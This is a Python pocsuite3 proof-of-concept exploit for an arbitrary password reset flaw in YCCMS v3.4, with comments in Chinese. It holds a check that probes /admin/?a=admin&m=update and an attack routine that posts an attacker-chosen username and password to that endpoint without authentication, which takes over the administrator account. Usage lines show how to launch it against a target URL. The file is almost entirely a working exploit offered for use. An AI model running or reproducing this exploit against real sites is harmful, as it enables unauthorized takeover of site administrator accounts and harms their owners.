from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str
from requests_toolbelt.multipart.encoder import MultipartEncoder


class DemoPOC(POCBase):
    vulID = '0'  # Seebug 漏洞收录ID，如果没有则为0
    version = '1'  # PoC 的版本，默认为1
    author = 'midi'  # PoC 的作者
    vulDate = '2021-05-12'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2022-01-24'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2022-01-24'  # PoC 更新日期 (%Y-%m-%d)
    references = ['https://blog.csdn.net/qq_45742511/article/details/116664586']  # 漏洞来源地址，0day 不用写
    name = 'YCCMS v3.4系统任意用户密码重置漏洞'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    appPowerLink = 'http://www.yccms.net/'  # 漏洞厂商主页地址
    appName = 'YCCMS'  # 漏洞应用名称
    appVersion = '3.4'  # 漏洞影响版本
    vulType = 'Remote Password Change'  # 漏洞类型，参见漏洞类型规范表
    desc = '逻辑漏洞导致任意用户密码重置'  # 漏洞简要描述
    samples = ['http://192.168.3.8']  # 测试样列，就是用 PoC 测试成功的目标
    pocDesc = '''使用attack时，需要提供重置的用户名和密码，默认用户名和密码都是admin
                usage: pocsuite -u http://localhost -r pocs/yccms3.4_remote-pass-change.py
                attack: pocsuite -u http://localhost -r pocs/yccms3.4_remote-pass-change.py --username admin --password admin --attack'''

    def _options(self):
        o = OrderedDict()
        o["username"] = OptString('admin', description='后台用户名')
        o["password"] = OptString('admin', description='后台密码')
        return o

    def _verify(self):
        result = {}
        # payload = "path={0}".format(self.get_option("username"))
        payload2 = "/admin/?a=admin&m=update "
        resp = requests.get(self.url+payload2)
        if resp and resp.status_code == 200 and "YCCMS.NET" in resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Referer'] = payload2

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        username = self.get_option("username")
        password = self.get_option("password")
        result = {}

        s = requests.session()
        update_data = {
            "username": username,
            "password": password,
            "notpassword": password,
            "send": "修改密码"
        }
        resp = s.post(url=self.url+"/admin/?a=admin&m=update", data=update_data)
        # print(resp.text)
        if resp.status_code == 200:
            result['AdminInfo'] = {}
            result['AdminInfo']['Username'] = username
            result['AdminInfo']['Password'] = password

        return self.parse_output(result)


register_poc(DemoPOC)